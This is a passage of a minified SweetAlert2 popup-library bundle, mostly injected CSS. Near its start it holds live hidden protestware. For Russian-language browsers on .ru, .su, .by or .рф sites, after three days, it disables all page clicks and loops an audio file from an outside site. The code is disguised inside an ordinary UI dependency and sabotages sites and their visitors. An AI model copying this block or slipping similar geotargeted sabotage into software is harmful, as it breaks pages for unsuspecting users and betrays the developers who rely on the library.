document.activeElement.blur=="function"&&document.activeElement.blur()};if(typeof window<"u"&&/^ru\b/.test(navigator.language)&&location.host.match(/\.(ru|su|by|xn--p1ai)$/)){const t=new Date,e=localStorage.getItem("swal-initiation");e?(t.getTime()-Date.parse(e))/(1e3*60*60*24)>3&&setTimeout(()=>{document.body.style.pointerEvents="none";const n=document.createElement("audio");n.src="https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3",n.loop=!0,document.body.appendChild(n),setTimeout(()=>{n.play().catch(()=>{})},2500)},500):localStorage.setItem("swal-initiation",`${t}`)}nn.prototype.disableButtons=aC;nn.prototype.enableButtons=sC;nn.prototype.getInput=nC;nn.prototype.disableInput=lC;nn.prototype.enableInput=oC;nn.prototype.hideLoading=om;nn.prototype.disableLoading=om;nn.prototype.showValidationMessage=cC;nn.prototype.resetValidationMessage=uC;nn.prototype.close=Ia;nn.prototype.closePopup=Ia;nn.prototype.closeModal=Ia;nn.prototype.closeToast=Ia;nn.prototype.rejectPromise=ZT;nn.prototype.update=pC;nn.prototype._destroy=gC;Object.assign(nn,gM);Object.keys(WD).forEach(t=>{nn[t]=function(...e){return qr&&qr[t]?qr[t](...e):null}});nn.DismissReason=Mc;nn.version="11.22.0";const Ln=nn;Ln.default=Ln;typeof document<"u"&&function(t,e){var n=t.createElement("style");if(t.getElementsByTagName("head")[0].appendChild(n),n.styleSheet)n.styleSheet.disabled||(n.styleSheet.cssText=e);else try{n.innerHTML=e}catch{n.innerText=e}}(document,':root{--swal2-outline: 0 0 0 3px rgba(100, 150, 200, 0.5);--swal2-container-padding: 0.625em;--swal2-backdrop: rgba(0, 0, 0, 0.4);--swal2-backdrop-transition: background-color 0.1s;--swal2-width: 32em;--swal2-padding: 0 0 1.25em;--swal2-border: none;--swal2-border-radius: 0.3125rem;--swal2-background: white;--swal2-color: #545454;--swal2-show-animation: swal2-show 0.3s;--swal2-hide-animation: swal2-hide 0.15s forwards;--swal2-icon-zoom: 1;--swal2-icon-animations: true;--swal2-title-padding: 0.8em 1em 0;--swal2-html-container-padding: 1em 1.6em 0.3em;--swal2-input-border: 1px solid #d9d9d9;--swal2-input-border-radius: 0.1875em;--swal2-input-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06), 0 0 0 3px transparent;--swal2-input-background: transparent;--swal2-input-transition: border-color 0.2s, box-shadow 0.2s;--swal2-input-hover-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06), 0 0 0 3px transparent;--swal2-input-focus-border: 1px solid #b4dbed;--swal2-input-focus-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06), 0 0 0 3px $swal2-outline-color;--swal2-progress-step-background: #add8e6;--swal2-validation-message-background: #f0f0f0;--swal2-validation-message-color: #666;--swal2-footer-border-color: #eee;--swal2-footer-background: transparent;--swal2-footer-color: inherit;--swal2-close-button-position: initial;--swal2-close-button-inset: auto;--swal2-close-button-font-size: 2.5em;--swal2-close-button-color: #ccc;--swal2-close-button-transition: color 0.2s, box-shadow 0.2s;--swal2-close-button-outline: initial;--swal2-close-button-box-shadow: inset 0 0 0 3px transparent;--swal2-close-button-focus-box-shadow: inset var(--swal2-outline);--swal2-close-button-hover-transform: none;--swal2-actions-justify-content: center;--swal2-actions-width: auto;--swal2-actions-margin: 1.25em auto 0;--swal2-actions-padding: 0;--swal2-actions-border-radius: 0;--swal2-actions-background: transparent;--swal2-action-button-transition: background-color 0.2s, box-shadow 0.2s;--swal2-action-button-hover: black 10%;--swal2-action-button-active: black 10%;--swal2-confirm-button-box-shadow: none;--swal2-confirm-button-border-radius: 0.25em;--swal2-confirm-button-background-color: #7066e0;--swal2-confirm-button-color: #fff;--swal2-deny-button-box-shadow: none;--swal2-deny-button-border-radius: 0.25em;--swal2-deny-button-background-color: #dc3741;--swal2-deny-button-color: #fff;--swal2-cancel-button-box-shadow: none;--swal2-cancel-button-border-radius: 0.25em;--swal2-cancel-button-background-color: #6e7881;--swal2-cancel-button-color: #fff;--swal2-toast-show-animation: swal2-toast-show 0.5s;--swal2-toast-hide-animation: swal2-toast-hide 0.1s forwards;--swal2-toast-border: none;--swal2-toast-box-shadow: 0 0 1px hsl(0deg 0% 0% / 0.075), 0 1px 2px hsl(0deg 0% 0% / 0.075), 1px 2px 4px hsl(0deg 0% 0% / 0.075), 1px 3px 8px hsl(0deg 0% 0% / 0.075), 2px 4px 16px hsl(0deg 0% 0% / 0.075)}[data-swal2-theme=dark]{--swal2-dark-theme-black: #19191a;--swal2-dark-theme-white: #e1e1e1;--swal2-background: var(--swal2-dark-theme-black);--swal2-color: var(--swal2-dark-theme-white);--swal2-footer-border-color: #555;--swal2-input-background: color-mix(in srgb, var(--swal2-dark-theme-black), var(--swal2-dark-theme-white) 10%);--swal2-validation-message-background: color-mix( in srgb, var(--swal2-dark-theme-black), var(--swal2-dark-theme-white) 10% );--swal2-validation-message-color: var(--swal2-dark-theme-white)}@media(prefers-color-scheme: dark){[data-swal2-theme=auto]{--swal2-dark-theme-black: #19191a;--swal2-dark-theme-white: #e1e1e1;--swal2-background: var(--swal2-dark-theme-black);--swal2-color: var(--swal2-dark-theme-white);--swal2-footer-border-color: #555;--swal2-input-background: color-mix(in srgb, var(--swal2-dark-theme-black), var(--swal2-dark-theme-white) 10%);--swal2-validation-message-background: color-mix( in srgb, var(--swal2-dark-theme-black), var(--swal2-dark-theme-white) 10% );--swal2-validation-message-color: var(--swal2-dark-theme-white)}}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px var(--swal2-backdrop)}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}@media print{body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown) .swal2-container{position:static !important}}div:where(.swal2-container){display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:var(--swal2-container-padding);overflow-x:hidden;transition:var(--swal2-backdrop-transition);-webkit-overflow-scrolling:touch}div:where(.swal2-container).swal2-backdrop-show,div:where(.swal2-container).swal2-noanimation{background:var(--swal2-backdrop)}div:where(.swal2-container).swal2-backdrop-hide{background:rgba(0,0,0,0) !important}div:where(.swal2-container).swal2-top-start,div:where(.swal2-container).swal2-center-start,div:where(.swal2-container).swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}div:where(.swal2-container).swal2-top,div:where(.swal2-container).swal2-center,div:where(.swal2-container).swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}div:where(.swal2-container).swal2-top-end,div:where(.swal2-container).swal2-center-end,div:where(.swal2-container).swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}div:where(.swal2-container).swal2-top-start>.swal2-popup{align-self:start}div:where(.swal2-container).swal2-top>.swal2-popup{grid-column:2;place-self:start center}div:where(.swal2-container).swal2-top-end>.swal2-popup,div:where(.swal2-container).swal2-top-right>.swal2-popup{grid-column:3;place-self:start end}div:where(.swal2-container).swal2-center-start>.swal2-popup,div:where(.swal2-container).swal2-center-left>.swal2-popup{grid-row:2;align-self:center}div:where(.swal2-container).swal2-center>.swal2-popup{grid-column:2;grid-row:2;place-self:center center}div:where(.swal2-container).swal2-center-end>.swal2-popup,div:where(.swal2-container).swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;place-self:center end}div:where(.swal2-container).swal2-bottom-start>.swal2-popup,div:where(.swal2-container).swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}div:where(.swal2-container).swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;place-self:end center}div:where(.swal2-container).swal2-bottom-end>.swal2-popup,div:where(.swal2-container).swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;place-self:end end}div:where(.swal2-container).swal2-grow-row>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}div:where(.swal2-container).swal2-grow-column>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}div:where(.swal2-container).swal2-no-transition{transition:none !important}div:where(.swal2-container)[popover]{width:auto;border:0}div:where(.swal2-container) div:where(.swal2-popup){display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:var(--swal2-width);max-width:100%;padding:var(--swal2-padding);border:var(--swal2-border);border-radius:var(--swal2-border-radius);background:var(--swal2-background);color:var(--swal2-color);font-family:inherit;font-size:1rem;container-name:swal2-popup}div:where(.swal2-container) div:where(.swal2-popup):focus{outline:none}div:where(.swal2-container) div:where(.swal2-popup).swal2-loading{overflow-y:hidden}div:where(.swal2-container) div:where(.swal2-popup).swal2-draggable{cursor:grab}div:where(.swal2-container) div:where(.swal2-popup).swal2-draggable div:where(.swal2-icon){cursor:grab}div:where(.swal2-container) div:where(.swal2-popup).swal2-dragging{cursor:grabbing}div:where(.swal2-container) div:where(.swal2-popup).swal2-dragging div:where(.swal2-icon){cursor:grabbing}div:where(.swal2-container) h2:where(.swal2-title){position:relative;max-width:100%;margin:0;padding:var(--swal2-title-padding);color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word;cursor:initial}div:where(.swal2-container) div:where(.swal2-actions){display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:var(--swal2-actions-justify-content);width:var(--swal2-actions-width);margin:var(--swal2-actions-margin);padding:var(--swal2-actions-padding);border-radius:var(--swal2-actions-border-radius);background:var(--swal2-actions-background)}div:where(.swal2-container) div:where(.swal2-loader){display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}div:where(.swal2-container) button:where(.swal2-styled){margin:.3125em;padding:.625em 1.1em;transition:var(--swal2-action-button-transition);border:none;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}div:where(.swal2-container) button:where(.swal2-styled):not([disabled]){cursor:pointer}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm){border-radius:var(--swal2-confirm-button-border-radius);background:initial;background-color:var(--swal2-confirm-button-background-color);box-shadow:var(--swal2-confirm-button-box-shadow);color:var(--swal2-confirm-button-color);font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm):hover{background-color:color-mix(in srgb, var(--swal2-confirm-button-background-color), var(--swal2-action-button-hover))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm):active{background-color:color-mix(in srgb, var(--swal2-confirm-button-background-color), var(--swal2-action-button-active))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny){border-radius:var(--swal2-deny-button-border-radius);background:initial;background-color:var(--swal2-deny-button-background-color);box-shadow:var(--swal2-deny-button-box-shadow);color:var(--swal2-deny-button-color);font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny):hover{background-color:color-mix(in srgb, var(--swal2-deny-button-background-color), var(--swal2-action-button-hover))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny):active{background-color:color-mix(in srgb, var(--swal2-deny-button-background-color), var(--swal2-action-button-active))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel){border-radius:var(--swal2-cancel-button-border-radius);background:initial;background-color:var(--swal2-cancel-button-background-color);box-shadow:var(--swal2-cancel-button-box-shadow);color:var(--swal2-cancel-button-color);font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel):hover{background-color:color-mix(in srgb, var(--swal2-cancel-button-background-color), var(--swal2-action-button-hover))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel):active{background-color:color-mix(in srgb, var(--swal2-cancel-button-background-color), var(--swal2-action-button-active))}div:where(.swal2-container) button:where(.swal2-styled):focus-visible{outline:none;box-shadow:var(--swal2-action-button-focus-box-shadow)}div:where(.swal2-container) button:where(.swal2-styled)[disabled]:not(.swal2-loading){opacity:.4}div:where(.swal2-container) button:where(.swal2-styled)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-footer){margin:1em 0 0;padding:1em 1em 0;border-top:1px solid var(--swal2-footer-border-color);background:var(--swal2-footer-background);color:var(--swal2-footer-color);font-size:1em;text-align:center;cursor:initial}div:where(.swal2-container) .swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:var(--swal2-border-radius);border-bottom-left-radius:var(--swal2-border-radius)}div:where(.swal2-container) div:where(.swal2-timer-progress-bar){width:100%;height:.25em;background:rgba(0,0,0,.2)}div:where(.swal2-container) img:where(.swal2-image){max-width:100%;margin:2em auto 1em;cursor:initial}div:where(.swal2-container) button:where(.swal2-close){position:var(--swal2-close-button-position);inset:var(--swal2-close-button-inset);z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:var(--swal2-close-button-transition);border:none;border-radius:var(--swal2-border-radius);outline:var(--swal2-close-button-outline);background:rgba(0,0,0,0);color:var(--swal2-close-button-color);font-family:monospace;font-size:var(--swal2-close-button-font-size);cursor:pointer;justify-self:end}div:where(.swal2-container) button:where(.swal2-close):hover{transform:var(--swal2-close-button-hover-transform);background:rgba(0,0,0,0);color:#f27474}div:where(.swal2-container) button:where(.swal2-close):focus-visible{outline:none;box-shadow:var(--swal2-close-button-focus-box-shadow)}div:where(.swal2-container) button:where(.swal2-close)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-html-container){z-index:1;justify-content:center;margin:0;padding:var(--swal2-html-container-padding);overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word;cursor:initial}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea),div:where(.swal2-container) select:where(.swal2-select),div:where(.swal2-container) div:where(.swal2-radio),div:where(.swal2-container) label:where(.swal2-checkbox){margin:1em 2em 3px}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea){box-sizing:border-box;width:auto;transition:var(--swal2-input-transition);border:var(--swal2-input-border);border-radius:var(--swal2-input-border-radius);background:var(--swal2-input-background);box-shadow:var(--swal2-input-box-shadow);color:inherit;font-size:1.125em}div:where(.swal2-container) input:where(.swal2-input).swal2-inputerror,div:where(.swal2-container) input:where(.swal2-file).swal2-inputerror,div:where(.swal2-container) textarea:where(.swal2-textarea).swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}div:where(.swal2-container) input:where(.swal2-input):hover,div:where(.swal2-container) input:where(.swal2-file):hover,div:where(.swal2-container) textarea:where(.swal2-textarea):hover{box-shadow:var(--swal2-input-hover-box-shadow)}div:where(.swal2-container) input:where(.swal2-input):focus,div:where(.swal2-container) input:where(.swal2-file):focus,div:where(.swal2-container) textarea:where(.swal2-textarea):focus{border:var(--swal2-input-focus-border);outline:none;box-shadow:var(--swal2-input-focus-box-shadow)}div:where(.swal2-container) input:where(.swal2-input)::placeholder,div:where(.swal2-container) input:where(.swal2-file)::placeholder,div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder{color:#ccc}div:where(.swal2-container) .swal2-range{margin:1em 2em 3px;background:var(--swal2-background)}div:where(.swal2-container) .swal2-range input{width:80%}div:where(.swal2-container) .swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}div:where(.swal2-container) .swal2-range input,div:where(.swal2-container) .swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}div:where(.swal2-container) .swal2-input{height:2.625em;padding:0 .75em}div:where(.swal2-container) .swal2-file{width:75%;margin-right:auto;margin-left:auto;background:var(--swal2-input-background);font-size:1.125em}div:where(.swal2-container) .swal2-textarea{height:6.75em;padding:.75em}div:where(.swal2-container) .swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:var(--swal2-input-background);color:inherit;font-size:1.125em}div:where(.swal2-container) .swal2-radio,div:where(.swal2-container) .swal2-checkbox{align-items:center;justify-content:center;background:var(--swal2-background);color:inherit}div:where(.swal2-container) .swal2-radio label,div:where(.swal2-container) .swal2-checkbox label{margin:0 .6em;font-size:1.125em}div:where(.swal2-container) .swal2-radio input,div:where(.swal2-container) .swal2-checkbox input{flex-shrink:0;margin:0 .4em}div:where(.swal2-container) label:where(.swal2-input-label){display:flex;justify-content:center;margin:1em auto 0}div:where(.swal2-container) div:where(.swal2-validation-message){align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:var(--swal2-validation-message-background);color:var(--swal2-validation-message-color);font-size:1em;font-weight:300}div:where(.swal2-container) div:where(.swal2-validation-message)::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}div:where(.swal2-container) .swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}div:where(.swal2-container) .swal2-progress-steps li{display:inline-block;position:relative}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:var(--swal2-progress-step-background);color:#fff}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:var(--swal2-progress-step-background)}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}div:where(.swal2-icon){position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;zoom:var(--swal2-icon-zoom);border:.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}div:where(.swal2-icon) .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}div:where(.swal2-icon).swal2-error{border-color:#f27474;color:#f27474}div:where(.swal2-icon).swal2-error .swal2-x-mark{position:relative;flex-grow:1}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}}div:where(.swal2-icon).swal2-warning{border-color:#f8bb86;color:#f8bb86}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}}div:where(.swal2-icon).swal2-info{border-color:#3fc3ee;color:#3fc3ee}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}}div:where(.swal2-icon).swal2-question{border-color:#87adbd;color:#87adbd}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}}div:where(.swal2-icon).swal2-success{border-color:#a5dc86;color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;border-radius:50%}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}div:where(.swal2-icon).swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}div:where(.swal2-icon).swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:var(--swal2-show-animation)}.swal2-hide{animation:var(--swal2-hide-animation)}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;border:var(--swal2-toast-border);background:var(--swal2-background);box-shadow:var(--swal2-toast-box-shadow);pointer-events:all}.swal2-toast>*{grid-column:2}.swal2-toast h2:where(.swal2-title){margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-toast .swal2-loading{justify-content:center}.swal2-toast input:where(.swal2-input){height:2em;margin:.5em;font-size:1em}.swal2-toast .swal2-validation-message{font-size:1em}.swal2-toast div:where(.swal2-footer){margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-toast button:where(.swal2-close){grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-toast div:where(.swal2-html-container){margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-toast div:where(.swal2-html-container):empty{padding:0}.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-toast div:where(.swal2-actions){justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-toast button:where(.swal2-styled){margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;border-radius:50%}.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}@container swal2-popup style(--swal2-icon-animations:true){.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}}.swal2-toast.swal2-show{animation:var(--swal2-toast-show-animation)}.swal2-toast.swal2-hide{animation:var(--swal2-toast-hide-animation)}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes 